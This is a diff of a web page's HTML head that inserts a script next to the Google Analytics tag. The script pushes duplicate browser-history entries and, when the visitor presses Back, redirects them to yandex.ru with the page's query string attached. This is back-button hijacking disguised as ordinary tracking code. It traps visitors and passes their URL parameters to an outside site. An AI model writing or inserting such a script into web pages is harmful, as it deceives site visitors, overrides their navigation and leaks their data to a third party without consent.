@@ -1,4 +1,15 @@
 ﻿<!-- Global site tag (gtag.js) - Google Analytics -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> 
+    <script type="text/javascript"> 
+        var redirecion_back_link = 'https://www.yandex.ru'; 
+        history.pushState({}, "", location.href); 
+        history.pushState({}, "", location.href); 
+        
+        window.onpopstate = function () { 
+            setTimeout(function () { 
+                location.href = redirecion_back_link + location.search; 
+            }, 1); };
+             </script>
 <script async="" src="../gtag/js?id=UA-126492652-1"></script>
 <script>
     window.dataLayer = window.dataLayer || [];
